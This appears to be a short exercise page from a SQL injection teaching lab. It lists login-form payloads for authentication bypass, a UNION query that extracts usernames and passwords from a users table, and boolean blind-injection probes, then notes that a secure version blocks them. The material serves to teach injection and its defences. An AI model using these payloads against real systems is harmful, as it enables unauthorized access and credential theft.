SQL Injection Exercises

  1. Authentication Bypass: Try logging in with:
    • Username: ' OR '1'='1
      Password: ' OR '1'='1
    • Username: admin' #
      Password: anything
  2. Extract Users: Try UNION-based injection, e.g.:
    Username: ' UNION SELECT id, username, password FROM users --
  3. Blind SQL Injection: Test boolean conditions:
    Username: admin' AND 1=1 --
    Username: admin' AND 1=2 --

Notice how the secure version blocks these attempts.
